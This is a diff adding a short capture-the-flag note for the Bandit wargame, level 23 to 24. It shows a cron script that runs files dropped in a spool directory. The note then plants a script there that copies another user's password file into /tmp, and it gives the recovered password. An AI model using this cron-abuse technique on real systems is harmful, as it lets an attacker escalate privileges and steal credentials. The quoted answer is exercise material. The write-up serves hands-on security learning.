@@ -1,0 +1,40 @@
+login bandit23
+
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+=>
+"
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+"
+
+so it will execute the files in /var/spool/bandit24/
+
+`echo 'ls' > /var/spool/bandit24/test.zhe.feng`
+it works, so it means i can write a script there.
+
+create a file called /tmp/zhefeng.sh, add following content:
+cat /etc/bandit_pass/bandit24 > /tmp/zhefeng_out
+
+chmod +x /tmp/zhefeng.sh
+cp /tmp/zhefeng.sh /var/spool/bandit24/zhefeng.sh
+
+wait for a while, then
+cat /tmp/zhefeng_out
+=> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+
+
